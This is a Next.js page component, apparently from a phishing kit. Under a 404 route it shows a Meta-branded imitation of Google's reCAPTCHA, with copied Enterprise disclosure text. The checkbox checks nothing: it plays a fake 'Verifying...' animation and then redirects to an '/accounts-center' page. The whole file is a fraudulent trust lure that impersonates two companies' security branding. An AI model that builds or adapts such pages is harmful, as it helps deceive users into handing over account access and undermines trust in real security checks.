"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function NotFound() {
  const [isChecked, setIsChecked] = useState(false);
  const [isAnimating, setIsAnimating] = useState(false);
  const router = useRouter();

  const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.checked) {
      setIsAnimating(true);
      setIsChecked(true);
      
      // Simulate verification delay like real reCAPTCHA
      setTimeout(() => {
        setIsAnimating(false);
        // Redirect to homepage after verification
        setTimeout(() => {
          router.push("/accounts-center");
        }, 300);
      }, 1500);
    } else {
      setIsChecked(false);
      setIsAnimating(false);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-white px-4 py-12">
      <div className="w-full max-w-lg">
        {/* Meta Logo - smaller and left aligned */}
        <div className="mb-8 flex justify-start">
          <Image src="/logo-meta.svg" alt="Meta" width={60} height={20} className="h-5 w-auto" />
        </div>

        {/* reCAPTCHA Form with Border - left aligned, same width as text */}
        <div className="mb-8 w-full max-w-md rounded border border-slate-300 bg-slate-50 p-4">
          <div className="relative flex items-center justify-between">
            {/* Left side: Checkbox and text */}
            <div className="flex items-center gap-3">
              <label className="flex cursor-pointer items-center gap-3">
                <div className="relative">
                  <input
                    type="checkbox"
                    checked={isChecked}
                    onChange={handleCheckboxChange}
                    disabled={isAnimating}
                    className={`h-8 w-8 cursor-pointer appearance-none rounded border-2 bg-white hover:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-1 disabled:cursor-not-allowed transition-all duration-100 ${
                      isAnimating
                        ? "border-transparent opacity-0"
                        : isChecked
                        ? "border-blue-600"
                        : "border-slate-900"
                    }`}
                  />
                  {/* Spinning border effect during verification */}
                  {isAnimating && (
                    <div className="absolute -inset-1 rounded">
                      <svg
                        className="h-10 w-10 animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 40 40"
                      >
                        <circle
                          cx="20"
                          cy="20"
                          r="17"
                          fill="none"
                          stroke="#4285F4"
                          strokeWidth="3"
                          strokeDasharray="30 50"
                          strokeLinecap="round"
                          opacity="0.9"
                        />
                      </svg>
                    </div>
                  )}
                  {/* Checkmark after verification */}
                  {isChecked && !isAnimating && (
                    <svg
                      className="absolute left-1.5 top-1.5 h-5 w-5 text-blue-600"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      style={{
                        strokeDasharray: "20",
                        animation: "checkmarkDraw 0.3s ease-in-out forwards, checkmark 0.2s ease-out 0.1s both",
                      }}
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={3}
                        d="M5 13l4 4L19 7"
                      />
                    </svg>
                  )}
                </div>
                <span className="text-base font-normal text-slate-900 transition-colors">
                  {isAnimating ? "Verifying..." : "I'm not a robot"}
                </span>
              </label>
            </div>

            {/* Right side: reCAPTCHA logo and links */}
            <div className="flex flex-col items-end">
              <div className="mb-1 flex items-center gap-2">
                <Image src="/recaptcha.png" alt="reCAPTCHA" width={24} height={24} className="h-6 w-6" />
                <span className="text-xs font-normal text-slate-600">reCAPTCHA</span>
              </div>
              <div className="flex gap-1 text-xs text-slate-500">
                <a href="#" className="hover:underline">
                  Privacy
                </a>
                <span>-</span>
                <a href="#" className="hover:underline">
                  Terms
                </a>
              </div>
            </div>
          </div>
        </div>

        {/* Information Text - narrower width */}
        <div className="w-full max-w-md space-y-4 text-left text-sm text-slate-600">
          <p>
            This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.
          </p>
          <p>
            We&apos;ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA
            Enterprise is subject to Google&apos;s Privacy Policy and Terms of Use.
          </p>
          <p>
            reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and
            sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes.
            This information is not used by Google for personalised advertising.
          </p>
        </div>
      </div>
    </div>
  );
}
